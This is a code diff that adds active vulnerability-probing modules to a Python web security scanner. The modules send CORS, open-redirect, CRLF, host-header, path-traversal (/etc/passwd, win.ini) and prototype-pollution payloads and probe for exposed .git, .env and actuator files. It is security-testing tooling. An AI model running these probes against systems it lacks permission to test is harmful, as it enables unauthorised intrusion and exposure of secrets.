@@ -50,9 +50,9 @@ import sys
 import time
 import urllib.parse
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from pathlib import Path
-from typing import Any
+from typing import Any, Callable
 
 try:
     import requests
@@ -750,6 +750,624 @@ def static_dom_scan(session: requests.Session, url: str, timeout: int) -> dict[s
 
 
 # ----------------------------------------------------------------------------
+# Vulnerability modules — each function takes (session, base_req, args) and
+# returns a list of Finding objects. All modules guard their own requests; one
+# failing module never aborts the run.
+# ----------------------------------------------------------------------------
+
+SEVERITY_RANK = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
+
+
+@dataclass
+class Finding:
+    module: str
+    severity: str
+    title: str
+    detail: str
+    evidence: dict[str, Any] = field(default_factory=dict)
+
+
+def _safe_get(session: requests.Session, url: str, headers: dict[str, str], timeout: int,
+              method: str = "GET", data: Any = None) -> requests.Response | None:
+    try:
+        return session.request(method=method, url=url, headers=headers,
+                               data=data, timeout=timeout, allow_redirects=False)
+    except requests.RequestException:
+        return None
+
+
+def mod_security_headers(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    resp = _safe_get(session, base_req["url"], base_req["headers"], args.timeout)
+    if resp is None:
+        return []
+    findings: list[Finding] = []
+    h = {k.lower(): v for k, v in resp.headers.items()}
+
+    is_https = base_req["url"].lower().startswith("https://")
+    checks: list[tuple[str, str, str, str]] = [
+        ("content-security-policy", "high", "Missing Content-Security-Policy",
+         "No CSP header — XSS mitigations rely entirely on output encoding. Any reflection becomes high impact."),
+        ("x-frame-options", "medium", "Missing X-Frame-Options",
+         "Page can be framed → clickjacking risk if CSP frame-ancestors not set."),
+        ("x-content-type-options", "medium", "Missing X-Content-Type-Options",
+         "MIME sniffing not blocked — type confusion attacks possible (XSS via JSON, etc.)."),
+        ("referrer-policy", "low", "Missing Referrer-Policy",
+         "Default policy may leak full URLs (with tokens) to third-party origins."),
+        ("permissions-policy", "low", "Missing Permissions-Policy",
+         "No restrictions on camera/microphone/geolocation/payment APIs."),
+    ]
+    if is_https:
+        checks.append(("strict-transport-security", "medium", "Missing Strict-Transport-Security",
+                       "HSTS not enforced — downgrade attacks possible on first visit."))
+
+    for header, sev, title, detail in checks:
+        if header not in h:
+            findings.append(Finding("security_headers", sev, title, detail,
+                                    evidence={"url": base_req["url"], "missing_header": header}))
+
+    csp = h.get("content-security-policy", "")
+    if csp:
+        weak: list[str] = []
+        if "'unsafe-inline'" in csp:
+            weak.append("'unsafe-inline'")
+        if "'unsafe-eval'" in csp:
+            weak.append("'unsafe-eval'")
+        if re.search(r"(?:^|\s)\*(?:\s|;|$)", csp):
+            weak.append("wildcard source (*)")
+        if "data:" in csp and "script-src" in csp.split(";")[0:]:
+            for d in csp.split(";"):
+                if "script-src" in d and "data:" in d:
+                    weak.append("script-src with data:")
+                    break
+        if weak:
+            findings.append(Finding("security_headers", "medium",
+                                    f"Weak CSP directives: {', '.join(weak)}",
+                                    "CSP present but contains weakening tokens.",
+                                    evidence={"csp": csp[:500]}))
+
+    hsts = h.get("strict-transport-security", "")
+    if hsts:
+        m = re.search(r"max-age=(\d+)", hsts)
+        if m and int(m.group(1)) < 31536000:
+            findings.append(Finding("security_headers", "low",
+                                    f"HSTS max-age short ({m.group(1)}s)",
+                                    "max-age < 1 year — partial HSTS coverage.",
+                                    evidence={"hsts": hsts}))
+        if "includesubdomains" not in hsts.lower():
+            findings.append(Finding("security_headers", "low",
+                                    "HSTS missing includeSubDomains",
+                                    "Subdomains not covered by HSTS.",
+                                    evidence={"hsts": hsts}))
+
+    xfo = h.get("x-frame-options", "")
+    if xfo and xfo.upper() not in ("DENY", "SAMEORIGIN"):
+        findings.append(Finding("security_headers", "low",
+                                f"X-Frame-Options: {xfo} (non-standard)",
+                                "Browsers ignore values other than DENY/SAMEORIGIN.",
+                                evidence={"xfo": xfo}))
+    return findings
+
+
+def mod_cookie_security(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    resp = _safe_get(session, base_req["url"], base_req["headers"], args.timeout)
+    if resp is None:
+        return []
+    findings: list[Finding] = []
+    set_cookies: list[str] = []
+    try:
+        raw = getattr(resp.raw, "headers", None)
+        if raw is not None:
+            for v in raw.get_all("Set-Cookie") or []:
+                set_cookies.append(v)
+    except Exception:
+        pass
+    if not set_cookies:
+        v = resp.headers.get("Set-Cookie")
+        if v:
+            set_cookies = [v]
+
+    is_https = base_req["url"].lower().startswith("https://")
+    for cookie_str in set_cookies:
+        name = cookie_str.split("=", 1)[0]
+        lower = cookie_str.lower()
+        issues: list[str] = []
+        if "httponly" not in lower:
+            issues.append("HttpOnly")
+        if is_https and "secure" not in lower:
+            issues.append("Secure")
+        if "samesite" not in lower:
+            issues.append("SameSite")
+        if issues:
+            findings.append(Finding("cookie_security", "medium",
+                                    f"Cookie '{name}' missing flags: {', '.join(issues)}",
+                                    "Missing flags increase XSS theft, MITM exposure, and CSRF risk.",
+                                    evidence={"set_cookie": cookie_str[:300]}))
+    return findings
+
+
+def mod_server_info(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    resp = _safe_get(session, base_req["url"], base_req["headers"], args.timeout)
+    if resp is None:
+        return []
+    findings: list[Finding] = []
+    for h in ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version",
+              "X-Runtime", "X-Generator", "X-Drupal-Cache", "X-Backend-Server", "Via"]:
+        v = resp.headers.get(h)
+        if v:
+            findings.append(Finding("server_info", "info",
+                                    f"{h}: {v}",
+                                    "Server fingerprint disclosed — useful for targeted exploit selection.",
+                                    evidence={h: v}))
+    return findings
+
+
+def mod_cors(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    findings: list[Finding] = []
+    target_netloc = urllib.parse.urlparse(base_req["url"]).netloc
+    probes: list[tuple[str, str]] = [
+        ("https://evil.com", "arbitrary origin"),
+        ("null", "null origin"),
+        (f"https://{target_netloc}.evil.com", "suffix bypass"),
+        (f"https://evil{target_netloc}", "prefix bypass"),
+        (f"https://{target_netloc.replace('.', 'x', 1)}", "char-replace bypass"),
+    ]
+    for origin, label in probes:
+        h = dict(base_req["headers"])
+        h["Origin"] = origin
+        resp = _safe_get(session, base_req["url"], h, args.timeout)
+        if resp is None:
+            continue
+        acao = resp.headers.get("Access-Control-Allow-Origin", "")
+        acac = resp.headers.get("Access-Control-Allow-Credentials", "")
+        if not acao:
+            continue
+        if acao == origin and acac.lower() == "true":
+            findings.append(Finding("cors", "high",
+                                    f"CORS: Origin reflection WITH credentials ({label})",
+                                    f"Server returned ACAO={acao}, ACAC=true for arbitrary Origin. "
+                                    "Attacker page can read authenticated responses.",
+                                    evidence={"origin_sent": origin, "acao": acao, "acac": acac}))
+        elif acao == "*" and acac.lower() == "true":
+            findings.append(Finding("cors", "high",
+                                    "CORS: wildcard ACAO with ACAC=true",
+                                    "Invalid CORS config (browsers block this combination) — indicates intent and likely an exploitable path.",
+                                    evidence={"acao": acao, "acac": acac}))
+        elif acao == origin:
+            findings.append(Finding("cors", "medium",
+                                    f"CORS: Origin reflection without credentials ({label})",
+                                    "Reflected Origin — exploitable if app exposes sensitive data without auth.",
+                                    evidence={"origin_sent": origin, "acao": acao}))
+        if rate_limit_ok(args):
+            time.sleep(args.rate_limit)
+    return findings
+
+
+def rate_limit_ok(args) -> bool:
+    return getattr(args, "rate_limit", 0) > 0
+
+
+REDIRECT_PARAMS = [
+    "redirect", "redirect_uri", "redirectUrl", "redirectURL", "redir",
+    "url", "next", "return", "returnTo", "returnUrl", "returnURL",
+    "dest", "destination", "rurl", "callback", "go", "u", "to",
+    "out", "link", "image_url", "checkout_url", "loginto", "logout",
+    "continue", "forward", "uri", "target", "ref",
+]
+
+OPEN_REDIRECT_PAYLOADS = [
+    "https://evil.example/",
+    "//evil.example/",
+    "/\\evil.example/",
+    "/\\/evil.example/",
+    "https:evil.example/",
+    "https://evil.example#@target/",
+    "https://target@evil.example/",
+    "https://target.evil.example/",
+    "////evil.example/",
+    "%2f%2fevil.example/",
+    "https://evil%2eexample/",
+    "javascript:alert(1)",
+    "data:text/html,<script>alert(1)</script>",
+]
+
+
+def mod_open_redirect(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    findings: list[Finding] = []
+    parsed = urllib.parse.urlparse(base_req["url"])
+    existing = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+    target_host = parsed.netloc.lower()
+    seen_params: set[str] = set()
+
+    for param in REDIRECT_PARAMS:
+        if param in seen_params:
+            continue
+        seen_params.add(param)
+        for payload in OPEN_REDIRECT_PAYLOADS:
+            new_params = [(k, v) for k, v in existing if k != param] + [(param, payload)]
+            new_query = urllib.parse.urlencode(new_params, safe="")
+            url = parsed._replace(query=new_query).geturl()
+            resp = _safe_get(session, url, base_req["headers"], args.timeout)
+            if rate_limit_ok(args):
+                time.sleep(args.rate_limit)
+            if resp is None:
+                continue
+            if resp.status_code not in (301, 302, 303, 307, 308):
+                continue
+            location = resp.headers.get("Location", "")
+            if not location:
+                continue
+            loc_lower = location.lower()
+            if "evil.example" in loc_lower or loc_lower.startswith("javascript:") or loc_lower.startswith("data:"):
+                findings.append(Finding("open_redirect", "medium",
+                                        f"Open redirect via ?{param}=",
+                                        f"Status {resp.status_code} redirected to attacker-controlled destination.",
+                                        evidence={"url": url, "payload": payload,
+                                                  "status": resp.status_code, "location": location}))
+                break
+            try:
+                parsed_loc = urllib.parse.urlparse(location)
+                if parsed_loc.netloc and parsed_loc.netloc.lower() != target_host \
+                        and "evil.example" not in parsed_loc.netloc.lower():
+                    findings.append(Finding("open_redirect", "low",
+                                            f"Possible open redirect via ?{param}= (off-host)",
+                                            f"Redirect landed on different host: {parsed_loc.netloc}.",
+                                            evidence={"url": url, "payload": payload,
+                                                      "location": location}))
+                    break
+            except Exception:
+                pass
+    return findings
+
+
+def mod_crlf_injection(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    findings: list[Finding] = []
+    INJECTED_HEADER = "X-CRLF-Test"
+    INJECTED_VAL = "Zq8K3xRq"
+    payloads = [
+        f"%0d%0a{INJECTED_HEADER}:%20{INJECTED_VAL}",
+        f"%0a{INJECTED_HEADER}:%20{INJECTED_VAL}",
+        f"%E5%98%8A%E5%98%8D{INJECTED_HEADER}:%20{INJECTED_VAL}",  # UTF-8 overlong CR/LF
+        f"%0d%0a%0d%0a{INJECTED_HEADER}:%20{INJECTED_VAL}",
+        f"/%0d%0a{INJECTED_HEADER}:%20{INJECTED_VAL}",
+    ]
+    parsed = urllib.parse.urlparse(base_req["url"])
+    existing = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+
+    candidate_params = list(dict.fromkeys(
+        [k for k, _ in existing] + COMMON_PARAM_NAMES[:12]
+    ))
+
+    for param in candidate_params:
+        for p in payloads:
+            new_query_parts = [f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}"
+                               for k, v in existing if k != param]
+            new_query_parts.append(f"{urllib.parse.quote(param)}={p}")
+            url = parsed._replace(query="&".join(new_query_parts)).geturl()
+            resp = _safe_get(session, url, base_req["headers"], args.timeout)
+            if rate_limit_ok(args):
+                time.sleep(args.rate_limit)
+            if resp is None:
+                continue
+            if INJECTED_HEADER.lower() in {k.lower() for k in resp.headers}:
+                findings.append(Finding("crlf_injection", "high",
+                                        f"CRLF injection via ?{param}=",
+                                        "Injected header appears in response — full HTTP response-splitting vector.",
+                                        evidence={"url": url, "payload": p,
+                                                  "injected_header_seen": resp.headers.get(INJECTED_HEADER, "")}))
+                break
+
+    # Header-based CRLF (try Referer)
+    for inject_header in ["Referer", "X-Forwarded-For", "X-Forwarded-Host"]:
+        h = dict(base_req["headers"])
+        h[inject_header] = f"a\r\n{INJECTED_HEADER}: {INJECTED_VAL}"
+        resp = _safe_get(session, base_req["url"], h, args.timeout)
+        if rate_limit_ok(args):
+            time.sleep(args.rate_limit)
+        if resp is None:
+            continue
+        if INJECTED_HEADER.lower() in {k.lower() for k in resp.headers}:
+            findings.append(Finding("crlf_injection", "high",
+                                    f"CRLF injection via {inject_header} header",
+                                    "Injected header appears in response.",
+                                    evidence={"injected_via": inject_header}))
+    return findings
+
+
+def mod_host_header_injection(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    findings: list[Finding] = []
+    EVIL = "evil.example"
+    probes: list[tuple[str, str | None]] = [
+        ("X-Forwarded-Host", EVIL),
+        ("X-Forwarded-Server", EVIL),
+        ("X-Host", EVIL),
+        ("X-Original-Host", EVIL),
+        ("Forwarded", f"host={EVIL}"),
+        ("X-Forwarded-Proto", "http"),
+    ]
+    for header, value in probes:
+        h = dict(base_req["headers"])
+        h[header] = value
+        resp = _safe_get(session, base_req["url"], h, args.timeout)
+        if rate_limit_ok(args):
+            time.sleep(args.rate_limit)
+        if resp is None:
+            continue
+        location = resp.headers.get("Location", "")
+        body_excerpt = (resp.text or "")[:8000]
+        if value in location:
+            findings.append(Finding("host_header_injection", "high",
+                                    f"{header} reflected in Location",
+                                    "Injected host appears in redirect Location — password-reset poisoning vector.",
+                                    evidence={"header": header, "value": value, "location": location}))
+        elif value in body_excerpt:
+            findings.append(Finding("host_header_injection", "medium",
+                                    f"{header} reflected in response body",
+                                    "Injected host appears in body — possible cache poisoning vector.",
+                                    evidence={"header": header, "value": value}))
+    return findings
+
+
+PATH_TRAVERSAL_PAYLOADS = [
+    "../../../../etc/passwd",
+    "..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "....//....//....//etc/passwd",
+    "..%252f..%252f..%252fetc/passwd",
+    "..\\..\\..\\..\\windows\\win.ini",
+    "..%5c..%5c..%5cwindows%5cwin.ini",
+    "/etc/passwd",
+    "file:///etc/passwd",
+    "..%c0%af..%c0%af..%c0%afetc/passwd",
+]
+PATH_TRAVERSAL_SIGNATURES: list[tuple[str, str]] = [
+    ("root:x:0:0:", "linux /etc/passwd"),
+    ("daemon:x:", "linux /etc/passwd"),
+    ("[fonts]", "windows win.ini"),
+    ("for 16-bit app support", "windows win.ini"),
+]
+FILE_PARAMS = ["file", "path", "page", "view", "doc", "document", "src",
+               "include", "template", "lang", "i", "load", "name"]
+
+
+def mod_path_traversal(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    findings: list[Finding] = []
+    parsed = urllib.parse.urlparse(base_req["url"])
+    existing = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+    for param in FILE_PARAMS:
+        for payload in PATH_TRAVERSAL_PAYLOADS:
+            new_params = [(k, v) for k, v in existing if k != param] + [(param, payload)]
+            new_query = urllib.parse.urlencode(new_params, safe="%/")
+            url = parsed._replace(query=new_query).geturl()
+            resp = _safe_get(session, url, base_req["headers"], args.timeout)
+            if rate_limit_ok(args):
+                time.sleep(args.rate_limit)
+            if resp is None or not resp.text:
+                continue
+            for sig, name in PATH_TRAVERSAL_SIGNATURES:
+                if sig in resp.text:
+                    findings.append(Finding("path_traversal", "high",
+                                            f"Path traversal via ?{param}= ({name})",
+                                            "Response body contains file-content signature after sending traversal payload.",
+                                            evidence={"url": url, "payload": payload,
+                                                      "signature": sig}))
+                    return findings  # one is enough — stop hammering
+    return findings
+
+
+def mod_http_methods(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    findings: list[Finding] = []
+    resp = _safe_get(session, base_req["url"], base_req["headers"], args.timeout, method="OPTIONS")
+    if resp is None:
+        return []
+    allow = resp.headers.get("Allow") or resp.headers.get("Access-Control-Allow-Methods", "")
+    if allow:
+        findings.append(Finding("http_methods", "info",
+                                f"OPTIONS Allow: {allow}",
+                                "Methods declared by OPTIONS response.",
+                                evidence={"allow": allow}))
+        allow_upper = allow.upper()
+        if "TRACE" in allow_upper:
+            findings.append(Finding("http_methods", "medium",
+                                    "TRACE method enabled",
+                                    "Cross-Site Tracing (XST) possible — TRACE echoes request including cookies.",
+                                    evidence={"allow": allow}))
+        for risky in ["PUT", "DELETE", "PATCH"]:
+            if risky in allow_upper:
+                findings.append(Finding("http_methods", "low",
+                                        f"{risky} method advertised",
+                                        f"OPTIONS declares {risky} is allowed — investigate auth/authorization.",
+                                        evidence={"allow": allow}))
+    # Quick TRACE probe even without OPTIONS hint
+    trace = _safe_get(session, base_req["url"], base_req["headers"], args.timeout, method="TRACE")
+    if rate_limit_ok(args):
+        time.sleep(args.rate_limit)
+    if trace is not None and trace.status_code < 400 and "TRACE" in (trace.text or "").upper()[:200]:
+        findings.append(Finding("http_methods", "medium",
+                                "TRACE returned 2xx with echoed request",
+                                "Confirmed TRACE enabled — XST risk.",
+                                evidence={"status": trace.status_code}))
+    return findings
+
+
+def mod_prototype_pollution(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    findings: list[Finding] = []
+    marker = "ZpolutedZ"
+    payloads = [
+        f"__proto__[xsstest]={marker}",
+        f"__proto__.xsstest={marker}",
+        f"constructor[prototype][xsstest]={marker}",
+        f"constructor.prototype.xsstest={marker}",
+    ]
+    parsed = urllib.parse.urlparse(base_req["url"])
+    for p in payloads:
+        new_query = (parsed.query + "&" + p) if parsed.query else p
+        url = parsed._replace(query=new_query).geturl()
+        resp = _safe_get(session, url, base_req["headers"], args.timeout)
+        if rate_limit_ok(args):
+            time.sleep(args.rate_limit)
+        if resp is None:
+            continue
+        if marker in (resp.text or ""):
+            findings.append(Finding("prototype_pollution", "medium",
+                                    f"Marker reflected after pollution-style param: {p[:60]}",
+                                    "Server returned the polluted value — check if app merges query params into objects unsafely.",
+                                    evidence={"url": url}))
+    return findings
+
+
+SENSITIVE_PATHS: list[tuple[str, str]] = [
+    ("/robots.txt", "info"),
+    ("/sitemap.xml", "info"),
+    ("/.well-known/security.txt", "info"),
+    ("/.git/HEAD", "high"),
+    ("/.git/config", "high"),
+    ("/.env", "high"),
+    ("/.env.local", "high"),
+    ("/.htaccess", "medium"),
+    ("/web.config", "medium"),
+    ("/server-status", "high"),
+    ("/server-info", "high"),
+    ("/phpinfo.php", "high"),
+    ("/info.php", "high"),
+    ("/swagger.json", "medium"),
+    ("/swagger-ui.html", "medium"),
+    ("/api-docs", "medium"),
+    ("/openapi.json", "medium"),
+    ("/v2/api-docs", "medium"),
+    ("/actuator", "high"),
+    ("/actuator/health", "medium"),
+    ("/actuator/env", "high"),
+    ("/actuator/heapdump", "high"),
+    ("/admin", "low"),
+    ("/admin/", "low"),
+    ("/console", "medium"),
+    ("/wp-admin", "low"),
+    ("/wp-login.php", "low"),
+    ("/login", "info"),
+    ("/graphql", "medium"),
+    ("/.DS_Store", "low"),
+    ("/backup.zip", "high"),
+    ("/dump.sql", "high"),
+    ("/crossdomain.xml", "info"),
+    ("/clientaccesspolicy.xml", "info"),
+]
+
+
+def mod_sensitive_paths(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    findings: list[Finding] = []
+    parsed = urllib.parse.urlparse(base_req["url"])
+    root = f"{parsed.scheme}://{parsed.netloc}"
+    for path, sev in SENSITIVE_PATHS:
+        url = root + path
+        resp = _safe_get(session, url, base_req["headers"], args.timeout)
+        if rate_limit_ok(args):
+            time.sleep(args.rate_limit)
+        if resp is None:
+            continue
+        if resp.status_code in (200, 201, 401, 403):
+            ctype = resp.headers.get("Content-Type", "")
+            body_excerpt = (resp.text or "")[:500]
+            # 401/403 still useful — confirms endpoint exists
+            level = "info" if resp.status_code in (401, 403) else sev
+            findings.append(Finding("sensitive_paths", level,
+                                    f"{path} → HTTP {resp.status_code}",
+                                    f"Path exists (status {resp.status_code}). Check if content leaks data.",
+                                    evidence={"url": url, "status": resp.status_code,
+                                              "content_type": ctype, "body_excerpt": body_excerpt}))
+    return findings
+
+
+def mod_https_downgrade(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    parsed = urllib.parse.urlparse(base_req["url"])
+    if parsed.scheme != "https":
+        return []
+    http_url = parsed._replace(scheme="http").geturl()
+    resp = _safe_get(session, http_url, base_req["headers"], args.timeout)
+    if rate_limit_ok(args):
+        time.sleep(args.rate_limit)
+    if resp is None:
+        return []
+    findings: list[Finding] = []
+    location = resp.headers.get("Location", "")
+    if resp.status_code < 400 and not location:
+        findings.append(Finding("https_downgrade", "high",
+                                "Plain HTTP returns 2xx without redirect",
+                                "HTTPS endpoint serves the same content over HTTP — MITM exposure.",
+                                evidence={"http_url": http_url, "status": resp.status_code}))
+    elif resp.status_code in (301, 302, 307, 308) and location:
+        if location.lower().startswith("http://"):
+            findings.append(Finding("https_downgrade", "high",
+                                    "HTTP redirects to another HTTP URL",
+                                    "Plain HTTP redirect chain stays on HTTP — no HTTPS upgrade.",
+                                    evidence={"location": location}))
+    return findings
+
+
+def mod_cache_deception(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
+    findings: list[Finding] = []
+    parsed = urllib.parse.urlparse(base_req["url"])
+    for suffix in [".css", ".js", ".jpg", ".png", "/styles.css", "/script.js"]:
+        new_path = parsed.path.rstrip("/") + suffix
+        url = parsed._replace(path=new_path).geturl()
+        resp = _safe_get(session, url, base_req["headers"], args.timeout)
+        if rate_limit_ok(args):
+            time.sleep(args.rate_limit)
+        if resp is None:
+            continue
+        ctype = resp.headers.get("Content-Type", "").lower()
+        cache_control = resp.headers.get("Cache-Control", "").lower()
+        # Cache-deception only matters if content is dynamic/HTML but cacheable
+        if resp.status_code == 200 and "text/html" in ctype and (
+                "public" in cache_control or "max-age" in cache_control or not cache_control
+        ):
+            findings.append(Finding("cache_deception", "medium",
+                                    f"Cache deception: {suffix} suffix served HTML",
+                                    "Dynamic HTML served under static-looking URL; CDN may cache the user's authenticated page.",
+                                    evidence={"url": url, "content_type": ctype,
+                                              "cache_control": cache_control}))
+    return findings
+
+
+VULN_MODULES: list[tuple[str, Callable, str]] = [
+    ("security_headers", mod_security_headers, "passive: missing CSP/XFO/HSTS/XCTO/Referrer/Permissions"),
+    ("cookie_security", mod_cookie_security, "passive: cookie HttpOnly/Secure/SameSite flags"),
+    ("server_info", mod_server_info, "passive: Server/X-Powered-By fingerprints"),
+    ("cors", mod_cors, "active: Origin reflection + credentials"),
+    ("open_redirect", mod_open_redirect, "active: classic open-redirect bypasses on redirect-shaped params"),
+    ("crlf_injection", mod_crlf_injection, "active: CRLF (response splitting) in params + headers"),
+    ("host_header_injection", mod_host_header_injection, "active: Host / X-Forwarded-Host poisoning"),
+    ("path_traversal", mod_path_traversal, "active: traversal payloads in file/path-shaped params"),
+    ("http_methods", mod_http_methods, "semi-active: OPTIONS Allow header, TRACE probe"),
+    ("prototype_pollution", mod_prototype_pollution, "active: __proto__ query params"),
+    ("sensitive_paths", mod_sensitive_paths, "active: probe ~30 sensitive paths (.git/.env/swagger/actuator/etc.)"),
+    ("https_downgrade", mod_https_downgrade, "active: does http:// serve the same content"),
+    ("cache_deception", mod_cache_deception, "active: .css/.js suffix path-confusion"),
+]
+
+
+def run_vuln_modules(session: requests.Session, base_req: dict[str, Any], args,
+                     selected: list[str] | None, progress: bool = True) -> list[Finding]:
+    findings: list[Finding] = []
+    for name, fn, desc in VULN_MODULES:
+        if selected and name not in selected:
+            continue
+        if progress:
+            print(f"[mod] {name:25s} — {desc}", file=sys.stderr)
+        if getattr(args, "dry_run", False):
+            if progress:
+                print("      (dry-run) skipped", file=sys.stderr)
+            continue
+        try:
+            mod_findings = fn(session, base_req, args)
+            findings.extend(mod_findings)
+            if progress and mod_findings:
+                for f in mod_findings:
+                    print(f"      [{f.severity:6s}] {f.title}", file=sys.stderr)
+        except Exception as e:
+            print(f"      [error] {name} raised: {e}", file=sys.stderr)
+    return findings
+
+
+# ----------------------------------------------------------------------------
 # Test executor
 # ----------------------------------------------------------------------------
 
@@ -977,6 +1595,19 @@ def build_arg_parser() -> argparse.ArgumentParser:
     g_auto.add_argument("--full-accept", action="store_true",
                         help="Use all 6 Accept-header variants per payload, even in auto mode.")
 
+    g_vuln = p.add_argument_group("vulnerability modules (auto-run alongside XSS)")
+    g_vuln.add_argument("--modules", nargs="+",
+                        help=f"Restrict to specific modules. Available: {', '.join(m[0] for m in VULN_MODULES)}. "
+                             "Default: all run.")
+    g_vuln.add_argument("--skip-modules", nargs="+",
+                        help="Exclude specific modules.")
+    g_vuln.add_argument("--no-vuln-modules", action="store_true",
+                        help="Skip all vulnerability modules; only run XSS.")
+    g_vuln.add_argument("--no-xss", action="store_true",
+                        help="Skip the XSS battery; only run vulnerability modules.")
+    g_vuln.add_argument("--list-modules", action="store_true",
+                        help="List vulnerability modules and exit.")
+
     g_raw = p.add_argument_group("raw request options")
     g_raw.add_argument("--scheme", default="https", choices=["http", "https"],
                        help="Scheme for raw requests (default https).")
@@ -1013,6 +1644,12 @@ def main(argv: list[str] | None = None) -> int:
         print(f"\nAccept-header variants per payload: {len(ACCEPT_VARIANTS)}")
         total = sum(len(p) for p in PAYLOADS.values()) * len(ACCEPT_VARIANTS)
         print(f"Total test cases if all categories selected: {total}")
+        return 0
+
+    if args.list_modules:
+        print("Vulnerability modules:")
+        for name, _fn, desc in VULN_MODULES:
+            print(f"  {name:25s} {desc}")
         return 0
 
     if args.raw:
@@ -1052,10 +1689,29 @@ def main(argv: list[str] | None = None) -> int:
     dom_report: dict[str, Any] | None = None
     discovery: list[dict[str, Any]] = []
     all_results: list[dict[str, Any]] = []
+    vuln_findings: list[Finding] = []
 
-    if auto_mode:
+    # Run vulnerability modules in auto mode (or whenever no marker given).
+    # These don't depend on the XSS battery so we run them regardless.
+    if not args.no_vuln_modules and (auto_mode or args.modules):
+        selected = args.modules
+        if args.skip_modules:
+            base = selected if selected else [m[0] for m in VULN_MODULES]
+            selected = [m for m in base if m not in args.skip_modules]
         print("=" * 64, file=sys.stderr)
-        print("Auto mode — no marker provided (or --auto forced).", file=sys.stderr)
+        print("Vulnerability modules", file=sys.stderr)
+        print("=" * 64, file=sys.stderr)
+        try:
+            vuln_findings = run_vuln_modules(session, base_req, args,
+                                             selected=selected, progress=not args.quiet)
+        except Exception as e:
+            print(f"[vuln runner error] {e}", file=sys.stderr)
+
+    if args.no_xss:
+        print("--no-xss set; skipping XSS battery.", file=sys.stderr)
+    elif auto_mode:
+        print("=" * 64, file=sys.stderr)
+        print("XSS auto mode — no marker provided (or --auto forced).", file=sys.stderr)
         print("=" * 64, file=sys.stderr)
 
         try:
@@ -1146,6 +1802,10 @@ def main(argv: list[str] | None = None) -> int:
         summary = summarize(all_results)
         print_summary(summary)
 
+    # Vulnerability-finding summary
+    if vuln_findings:
+        print_vuln_findings(vuln_findings)
+
     if args.output:
         out: dict[str, Any] = {
             "base_request": {
@@ -1156,6 +1816,11 @@ def main(argv: list[str] | None = None) -> int:
             },
             "mode": "auto" if auto_mode else "manual",
             "results": all_results,
+            "vuln_findings": [
+                {"module": f.module, "severity": f.severity, "title": f.title,
+                 "detail": f.detail, "evidence": f.evidence}
+                for f in vuln_findings
+            ],
         }
         if dom_report is not None:
             out["dom_scan"] = dom_report
@@ -1170,6 +1835,29 @@ def main(argv: list[str] | None = None) -> int:
         print(f"Full report written to {args.output}", file=sys.stderr)
 
     return 0
+
+
+def print_vuln_findings(findings: list[Finding]) -> None:
+    findings_sorted = sorted(findings, key=lambda f: -SEVERITY_RANK.get(f.severity, 0))
+    by_sev: dict[str, int] = {}
+    for f in findings_sorted:
+        by_sev[f.severity] = by_sev.get(f.severity, 0) + 1
+    line = "=" * 64
+    print(f"\n{line}\nVulnerability Module Findings\n{line}")
+    print("Counts: " + ", ".join(
+        f"{s}={by_sev.get(s, 0)}" for s in ("critical", "high", "medium", "low", "info")
+        if by_sev.get(s, 0)
+    ) or "(none)")
+    for i, f in enumerate(findings_sorted, 1):
+        print(f"\n  [{i}] [{f.severity:6s}] [{f.module}] {f.title}")
+        print(f"      {f.detail}")
+        if f.evidence:
+            for k, v in list(f.evidence.items())[:4]:
+                vs = str(v)
+                if len(vs) > 200:
+                    vs = vs[:200] + "…"
+                print(f"      {k}: {vs}")
+    print(line + "\n")
 
 
 if __name__ == "__main__":
